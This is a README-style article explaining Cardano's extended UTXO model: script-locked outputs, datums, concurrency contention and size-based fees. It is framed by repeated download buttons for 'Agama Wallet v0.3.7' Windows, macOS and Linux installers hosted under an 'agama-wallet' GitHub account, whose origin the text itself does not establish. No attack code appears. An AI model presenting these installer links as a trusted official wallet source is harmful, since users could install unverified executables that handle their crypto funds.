[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# Cardano's Extended UTXO Model

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Cardano uses an extended UTXO model: outputs still hold value and are spent whole as in Bitcoin, but each output can also carry a datum and be guarded by a script. That extension is what lets Cardano run smart contracts on an output-based ledger. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it illustrates the same output accounting without the scripting layer.

## You'll see this if

You are comparing how two chains handle smart contracts and one of them describes "outputs with data attached", or a Cardano transaction shows an output that is locked to a script rather than to a key.

| Concept | Bitcoin | Cardano |
|---|---|---|
| Unit of value | Output | Output |
| Spending condition | Script over a key | Script, optionally with datum |
| Contract state | Not in the ledger model | Attached to outputs as datum |
| Change | New output to the wallet | New output to the wallet |
| Concurrency | Independent transactions | Outputs must not be double-used by scripts |

## Why it happens

The design goal was to keep the guarantees of the UTXO model while making contracts possible. In an account chain, a contract holds a balance and mutates it, which makes shared state easy and ordering mandatory. In a plain UTXO chain, there is no place to put contract state at all.

Cardano's answer is to put the state in the outputs. A script address holds outputs whose spending condition is the script, and each such output carries a datum that the script reads when the output is spent. A transaction that interacts with a contract consumes script outputs and produces new ones, so the "state" after the transaction is whatever the new outputs say.

That inheritance has visible consequences:

- **Validation is local.** A node checks the transaction against the outputs it consumes, as on any UTXO chain.
- **Concurrency is explicit.** Two transactions cannot spend the same script output, so contracts that funnel every user through one output serialise their users.
- **Fees follow size.** As with Bitcoin, a transaction consuming more outputs is larger and costs more.

[What a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md) defines the base unit, and [which blockchains use UTXO accounting](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) places Cardano among the output-based chains.

## Fix

There is no fault to repair; the practical work is reading a Cardano transaction correctly and knowing when the model constrains you.

1. **Identify which outputs are script-locked.** They pay a script address, not a key you hold, and they cannot be spent by signing alone.
2. **Read the datum before assuming the value is yours.** An output can hold value and be unspendable by you until the script's condition is met.
3. **Expect contention on popular contracts.** If many users interact with one output, some transactions will fail and need retrying.
4. **Budget fees by size.** Splitting an interaction across more outputs costs more, exactly as on Bitcoin.
5. **Do not compare contract behaviour across models.** A contract that keeps a running total in an account chain has no equivalent single-object home here.

For the wallet-side consequences of output accounting, [why a balance is not one number](https://github.com/agama-wallet/utxo/blob/main/why-balance-is-not-one-number.md) applies unchanged.

## If that did not work

If a transaction fails with an error about an output being spent, another transaction consumed it first. Rebuild the transaction against the current state rather than retrying the same body.

If an output cannot be spent despite the value being visible, the spending condition is not satisfied: a missing signature, an unmet datum condition, or a validity interval that has expired.

If a wallet shows a Cardano balance that a block explorer disagrees with, the wallet is probably not tracking script outputs, which many simple wallets do not. That is a limitation of the wallet's view, not a discrepancy in the chain.

## Prevention

- **Know which outputs are yours to spend.** A script address is not a savings account.
- **Retry failed contract transactions with fresh state.** Reusing a stale body guarantees another failure.
- **Expect contention on new contracts.** It is a property of the model, not a bug in the chain.
- **Keep fees in mind as output count grows.** The same consolidation logic applies as on Bitcoin.
- **Use a wallet that understands scripts if you interact with them.** A key-only wallet will show an incomplete picture, and a balance that excludes script-locked outputs is not a smaller holding.

## FAQ

### Is Cardano's model the same as Bitcoin's?

It is the same family with an extension: outputs and change work as in Bitcoin, but outputs can carry data and be guarded by scripts.

### Why do Cardano contracts sometimes serialise users?

Because a contract's state lives in specific outputs, and two transactions cannot spend the same output. Contracts that use one shared output therefore process one transaction at a time.

### Does the extended model change how fees work?

No, fees still relate to transaction size and the work the script performs. More outputs consumed means a larger transaction.

### Why not simply use an account model for contracts?

Because an account model makes shared mutable state easy and ordering mandatory, which has its own costs: every transaction from one account must wait for the previous one. Cardano's designers kept the output model and paid the concurrency price instead, which is why contracts on it need to be written around discrete outputs rather than one shared balance.

### Can a simple wallet hold Cardano assets?

It can hold value sent to key-controlled addresses. Outputs locked to scripts may not be visible or spendable without script support, which is a wallet limitation rather than a chain one.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [Which Blockchains Use the UTXO Model](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md)
- [UTXO vs Account Model: How the Two Ledger Designs Differ](https://github.com/agama-wallet/utxo/blob/main/outputs-versus-accounts.md)
- [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md)
